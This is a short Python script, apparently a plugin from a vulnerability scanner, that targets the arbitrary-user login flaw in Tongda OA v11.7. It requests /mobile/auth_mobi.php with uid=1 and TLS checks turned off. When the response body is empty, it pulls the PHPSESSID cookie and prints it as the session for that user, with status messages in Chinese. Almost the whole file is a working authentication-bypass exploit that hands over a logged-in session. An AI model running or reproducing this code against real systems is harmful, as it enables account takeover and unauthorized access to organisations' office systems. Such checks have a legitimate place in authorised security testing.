import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import re


def 通达OA_v11_7_在线用户登录(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    vuln_url=urldata+"/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=30)
        page=response.text
        if "RELOGIN" in page and response.status_code == 200:
            print(Vcolors.WARNING + "[x] 通达OA_A任意用户的登录漏洞不存在" +Vcolors.ENDC)
        elif response.status_code == 200 and page=="":
            PHPSESSION=re.findall(r'PHPSESSID=(.*?);', str(response.headers))
            print(Vcolors.RED +"[+]目标存在通达OA任意用户的登录漏洞,session为: {}".format(PHPSESSION) +Vcolors.ENDC)
        else:
            print(Vcolors.WARNING +"[x] 通达OA任意用户的登录漏洞不存在" +Vcolors.ENDC)
    except:
        logging.error("通达OA_v11_7_在线用户登录脚本出现异常")


